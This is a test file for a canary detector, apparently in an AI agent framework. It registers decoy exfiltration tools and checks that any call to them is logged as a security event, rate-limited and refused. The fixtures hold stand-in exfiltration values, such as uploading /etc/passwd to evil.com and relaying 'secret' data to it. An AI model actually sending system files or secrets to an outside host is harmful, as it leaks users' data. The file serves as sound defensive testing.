"""Tests for the phantom (canary) tool injection detector."""

import json
import pytest
from unittest.mock import patch

from tools.registry import registry
from tools.phantom_tools import (
    PHANTOM_SCHEMAS,
    get_phantom_events,
    _events,
    _events_lock,
    _rate_counts,
    _MAX_EVENTS,
    _RATE_LIMIT_MAX,
)


PHANTOM_NAMES = {s["name"] for s in PHANTOM_SCHEMAS}


class TestPhantomToolRegistration:
    """Phantom tools must be registered and visible in the schema."""

    def test_all_phantom_tools_registered(self):
        for name in PHANTOM_NAMES:
            entry = registry.get_entry(name)
            assert entry is not None, f"Phantom tool '{name}' not registered"
            assert entry.toolset == "phantom"

    def test_phantom_toolset_available(self):
        """Phantom tools must pass their availability check so the LLM sees them."""
        for name in PHANTOM_NAMES:
            entry = registry.get_entry(name)
            assert entry.check_fn is not None
            assert entry.check_fn() is True

    def test_phantom_schemas_are_valid(self):
        """Each schema must have name, description, and parameters."""
        for schema in PHANTOM_SCHEMAS:
            assert "name" in schema
            assert "description" in schema
            assert "parameters" in schema
            assert schema["parameters"]["type"] == "object"
            assert "required" in schema["parameters"]
            assert len(schema["parameters"]["required"]) > 0


class TestPhantomToolInvocation:
    """Calling a phantom tool must log the event and return an error."""

    @pytest.fixture(autouse=True)
    def _clear_events(self):
        """Reset the event log and rate limits before each test."""
        with _events_lock:
            _events.clear()
            _rate_counts.clear()
        yield
        with _events_lock:
            _events.clear()
            _rate_counts.clear()

    def test_handler_returns_error(self):
        entry = registry.get_entry("send_to_webhook")
        result = json.loads(entry.handler({"url": "https://evil.com", "payload": "{}"}))
        assert "error" in result

    def test_handler_records_event(self):
        entry = registry.get_entry("upload_file_external")
        entry.handler({"file_path": "/etc/passwd", "destination_url": "https://evil.com"})
        events = get_phantom_events()
        assert len(events) == 1
        assert events[0]["tool"] == "upload_file_external"
        assert events[0]["args"]["file_path"] == "/etc/passwd"

    def test_handler_logs_critical(self):
        entry = registry.get_entry("relay_data")
        with patch("tools.phantom_tools.logger") as mock_logger:
            entry.handler({"endpoint": "https://evil.com", "data": "secret"})
            mock_logger.critical.assert_called_once()
            call_args = mock_logger.critical.call_args[0]
            assert "SECURITY" in call_args[0]
            assert "relay_data" in str(call_args)

    def test_handler_truncates_long_args(self):
        """Large payloads must be truncated in log output to prevent log flooding."""
        entry = registry.get_entry("send_to_webhook")
        with patch("tools.phantom_tools.logger") as mock_logger:
            entry.handler({"url": "https://evil.com", "payload": "x" * 500})
            call_args = str(mock_logger.critical.call_args)
            # The logged args should be truncated, not contain the full 500 chars
            assert "x" * 500 not in call_args
            assert "…" in call_args

    def test_multiple_invocations_accumulate(self):
        for name in PHANTOM_NAMES:
            entry = registry.get_entry(name)
            entry.handler({"test": "true"})
        events = get_phantom_events()
        assert len(events) == len(PHANTOM_NAMES)
        recorded_names = {e["tool"] for e in events}
        assert recorded_names == PHANTOM_NAMES

    def test_all_handlers_return_valid_json(self):
        for name in PHANTOM_NAMES:
            entry = registry.get_entry(name)
            result = entry.handler({})
            parsed = json.loads(result)
            assert isinstance(parsed, dict)
            assert "error" in parsed

    def test_event_log_bounded(self):
        """Event log must not grow beyond _MAX_EVENTS."""
        entry = registry.get_entry("send_to_webhook")
        # Bypass rate limit by using different tools
        for schema in PHANTOM_SCHEMAS:
            e = registry.get_entry(schema["name"])
            for _ in range(_RATE_LIMIT_MAX):
                e.handler({})
        # Even with many calls, deque is bounded
        events = get_phantom_events()
        assert len(events) <= _MAX_EVENTS

    def test_rate_limiting(self):
        """Repeated calls to the same phantom tool must be rate-limited."""
        entry = registry.get_entry("relay_data")
        with patch("tools.phantom_tools.logger") as mock_logger:
            for _ in range(_RATE_LIMIT_MAX + 5):
                entry.handler({"endpoint": "x", "data": "y"})
            # Should have _RATE_LIMIT_MAX critical logs + some warnings
            assert mock_logger.critical.call_count == _RATE_LIMIT_MAX
            assert mock_logger.warning.call_count == 5

    def test_rate_limit_still_returns_error(self):
        """Even when rate-limited, handler must return an error to the model."""
        entry = registry.get_entry("forward_email")
        for _ in range(_RATE_LIMIT_MAX + 1):
            result = json.loads(entry.handler({"to": "x", "body": "y"}))
            assert "error" in result
